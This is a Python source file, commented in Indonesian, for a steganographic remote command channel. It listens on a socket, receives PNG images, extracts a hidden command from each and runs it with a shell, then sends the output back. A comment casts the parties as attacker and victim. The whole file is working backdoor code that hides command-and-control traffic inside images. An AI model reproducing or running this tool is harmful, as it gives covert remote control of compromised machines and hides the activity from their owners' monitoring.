import socket
from getopt import getopt
import os
import sys
import subprocess
import steganoImage

IP = ""
PORT = -1
LISTENER  = False # True = attacker, False = victim/client

# python server.py -i 127.0.0.1 -p 54321 -l

# check alamat ip apakah benar IPv4
def check_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except:
        return False

# fungsi yang akan dijalankan untuk menerima respon dari client
# gambar yang diterima akan di-decode terlebih dahulu untuk diambil command tersembunyi
# setelah itu, command tersebut akan dieksekusi 
def server_response(connect):
    while True:
        try:
            path = os.getcwd()
            connect.send(path.encode())
            getResponse = connect.recv(2048).decode()
            if getResponse != '':
                if getResponse == 'exit':
                    connect.close()
                    break

                elif getResponse == 'SEND':
                    print("Receiving image...")
                    f = open("untuk_server.png", "wb")
                    flag = 0
                    while True:
                        if flag == 1:
                            break
                        content = connect.recv(2048)
                        if b"#end" in content:
                            content = content[:-4]
                            flag = 1
                        f.write(content)
                    f.close()
                    print("Decoding content...")
                    response = steganoImage.decode("untuk_server.png")
                    print(f"content = \"{response}\"")
                    if response[:2] == 'cd':
                        try:
                            os.chdir(response[3:])
                            message = "Directory changed"
                            connect.send(message.encode())
                        except:
                            connect.send("Invalid directory".encode())
                    else:
                        process = subprocess.Popen(args=response, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        output, err = process.communicate()
                        if err != b'':
                            connect.send(err)
                        else:
                            connect.send(output)
                    print("Sending result...")
        except Exception:
            break
    pass

# fungsi yang akan dijalankan dengan option -l atau --listener
# fungsi ini akan melakukan listen pada ip dan port yang sudah ditentukan
def server():
    server_socket = socket.socket()
    server_socket.bind((IP, PORT))
    server_socket.listen(1)
    print("Listening now...")
    client_connect, (ip, port) = server_socket.accept()
    print(f"Connected with client on {ip}:{port}")

    server_response(client_connect)

    server_socket.close()
    client_connect.close()
    print("Connection closed!")
    pass

def process():
    if LISTENER == True:
        server()
    else:
        print("""Must activate "-l" or "--listener" """)
    pass


def main():
    global IP, PORT, LISTENER
    opts, _ = getopt(sys.argv[1:], "i:p:l", ["ip=", "port=", "listener"])

    for key, value in opts:
        if key in ["-i", "--ip"]:
            IP  = value
        if key in ["-p", "--port"]:
            PORT = int(value)
        if key in ["-l", "--listener"]:
            LISTENER = True

    if check_ip(IP) and PORT >= 0 and PORT <= 65535:
        process()
    else:
        print("Invalid argument(s)")
    # print(f"IP: {IP}, PORT: {PORT}, LISTENER: {LISTENER}")


if __name__ == "__main__":
    main()
